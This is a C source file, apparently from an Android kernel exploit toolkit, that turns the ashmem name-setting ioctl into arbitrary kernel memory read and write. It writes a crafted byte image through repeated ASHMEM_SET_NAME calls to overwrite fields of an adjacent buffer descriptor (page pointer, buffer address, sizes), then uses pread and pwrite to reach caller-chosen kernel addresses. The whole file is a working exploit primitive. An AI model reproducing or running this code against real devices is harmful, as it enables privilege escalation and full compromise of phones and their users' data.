/* lib/rw/nameblob.c -- see nameblob.h. */
#include "nameblob.h"

#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "../base/bytes.h"
#include "../target.h"
#include "../trigger/ashmem.h"

/* Size of the composed descriptor image. Large enough to reach every field the
 * redirection sets, and short enough to leave the buffer's tail untouched. */
#ifndef LIB_NAMEBLOB_BYTES
#define LIB_NAMEBLOB_BYTES 128
#endif

/* Placeholder for bytes the caller does not care about. Any non-zero value
 * works; a printable one keeps an accidental dump readable. */
#ifndef LIB_NAMEBLOB_FILLER
#define LIB_NAMEBLOB_FILLER 'A'
#endif

/* Field offsets within the buffer descriptor. Supplied by the target
 * description; the defaults exist so this module compiles standalone and are
 * overridden by any real build. */
#ifndef CFG_PAGE_OFF
#define CFG_PAGE_OFF             16
#endif
#ifndef CFG_NEEDS_READ_FILL_OFF
#define CFG_NEEDS_READ_FILL_OFF  80
#endif
#ifndef CFG_BIN_BUFFER_OFF
#define CFG_BIN_BUFFER_OFF       88
#endif
#ifndef CFG_BIN_BUFFER_SIZE_OFF
#define CFG_BIN_BUFFER_SIZE_OFF  96
#endif
#ifndef CFG_CB_MAX_SIZE_OFF
#define CFG_CB_MAX_SIZE_OFF      100
#endif

/* The same offsets relative to the start of the stored name: the driver's own
 * prefix sits between the two. */
#define BLOB_OFF(field) ((field) - ASHMEM_NAME_PREFIX_LEN)

static int set_prefix(int fd, const unsigned char *blob, size_t len, size_t upto)
{
	char name[ASHMEM_NAME_LEN];

	memset(name, LIB_NAMEBLOB_FILLER, sizeof(name));
	for (size_t i = 0; i < upto && i < len; i++)
		/* A zero byte would terminate this pass early; a later, shorter
		 * pass places it deliberately. */
		name[i] = blob[i] ? (char)blob[i] : 1;
	name[upto] = '\0';
	return ioctl(fd, ASHMEM_SET_NAME, name) ? -1 : 0;
}

int lib_nameblob_set(int fd, const unsigned char *blob, size_t len)
{
	if (len >= ASHMEM_NAME_LEN)
		return -1;

	/* First pass: every byte, with zeros stood in for. */
	if (set_prefix(fd, blob, len, len) != 0)
		return -1;

	/* Then one pass per zero byte, longest first, each terminating exactly
	 * where that zero belongs. Bytes past the terminator survive from the
	 * previous pass, so the buffer converges on the requested image. */
	for (size_t i = len; i > 0; i--) {
		if (blob[i - 1])
			continue;
		if (set_prefix(fd, blob, len, i - 1) != 0)
			return -1;
	}
	return 0;
}

ssize_t lib_nameblob_read(int fd, uintptr_t addr, void *out, size_t len)
{
	unsigned char blob[LIB_NAMEBLOB_BYTES];
	/* Choose the file position first; the page pointer then carries the
	 * caller's address, since the read lands at page + position. */
	off_t position = (off_t)(ASHMEM_NAME_PREFIX_WORD - len);
	uint64_t page = (uint64_t)addr - (uint64_t)position;

	memset(blob, 0, sizeof(blob));
	lib_put64(blob, BLOB_OFF(CFG_PAGE_OFF), page);
	lib_put32(blob, BLOB_OFF(CFG_NEEDS_READ_FILL_OFF), 0);
	if (lib_nameblob_set(fd, blob, sizeof(blob)) != 0)
		return -1;
	return pread(fd, out, len, position);
}

ssize_t lib_nameblob_write(int fd, uintptr_t addr, const void *data, size_t len)
{
	unsigned char blob[LIB_NAMEBLOB_BYTES];

	memset(blob, 0, sizeof(blob));
	lib_put64(blob, BLOB_OFF(CFG_BIN_BUFFER_OFF), (uint64_t)addr);
	lib_put32(blob, BLOB_OFF(CFG_BIN_BUFFER_SIZE_OFF), (uint32_t)len);
	lib_put32(blob, BLOB_OFF(CFG_CB_MAX_SIZE_OFF), 0);
	if (lib_nameblob_set(fd, blob, sizeof(blob)) != 0)
		return -1;
	return pwrite(fd, data, len, 0);
}

static int nameblob_read_fn(const struct krw *rw, kdirect_t addr, void *out, size_t len)
{
	return lib_nameblob_read(rw->fd, (uintptr_t)kd_val(addr), out, len) == (ssize_t)len;
}

static int nameblob_write_fn(const struct krw *rw, kdirect_t addr, const void *data, size_t len)
{
	return lib_nameblob_write(rw->fd, (uintptr_t)kd_val(addr), data, len) == (ssize_t)len;
}

struct krw lib_krw_nameblob(int fd)
{
	struct krw rw;

	rw.name = "name-blob";
	rw.fd = fd;
	rw.read = nameblob_read_fn;
	rw.write = nameblob_write_fn;
	return rw;
}
